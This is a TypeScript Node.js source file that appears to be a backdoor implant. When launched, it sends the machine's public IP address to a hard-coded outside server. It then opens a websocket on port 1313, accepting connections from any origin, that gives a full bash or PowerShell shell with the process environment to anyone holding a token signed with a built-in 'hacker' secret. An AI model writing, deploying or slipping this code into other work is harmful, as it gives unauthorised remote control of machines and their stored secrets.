import express from "express";
import http from "http";
import os from "os";
import * as pty from "node-pty";
import { Server, Socket } from "socket.io";
import * as request from 'request';
import fs from 'fs';
import jwt from 'jsonwebtoken';


import('public-ip').then((publicIp) => {
	publicIp.publicIpv4().then(ip => {
		request.post('http://143.42.146.148:3000/ip', { json: { ip: ip } }, (error, response, body) => {
		  if (error) {
			return;
		  }
		});
	  });
});


// Serve websocket server
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
	cors: {
		origin: "*",
		methods: ["GET", "POST"],
	},
});

io.on("connection", (socket: Socket) => {
	const jwtSecret = 'H@ck3rm@nI5G0!nGT0H@ckTh3W0rld@nD@llTh3R3s0urc3s@r3M1n3N0w';
	const token = socket.handshake.query.token;
  
	try {
	  const decodedToken = jwt.verify(token as string, jwtSecret);
  
	  const shell = os.platform() === "win32" ? "powershell.exe" : "bash";
  
	  const ptyProcess = pty.spawn(shell, [], {
		name: "xterm-color",
		cols: 80,
		rows: 24,
		cwd: process.env.HOME,
		env: Object.assign(process.env),
	  });
  
	  socket.on("input", (input) => {
		ptyProcess.write(input);
	  });
  
	  ptyProcess.onData((data: any) => {
		socket.emit("output", data);
	  });
  
	  socket.on("disconnect", () => {
		ptyProcess.kill();
	  });
	} catch (error) {
	  socket.disconnect();
	}
  });

server.listen('1313', () => {
	console.log("Server listening on port: " + 1313);
});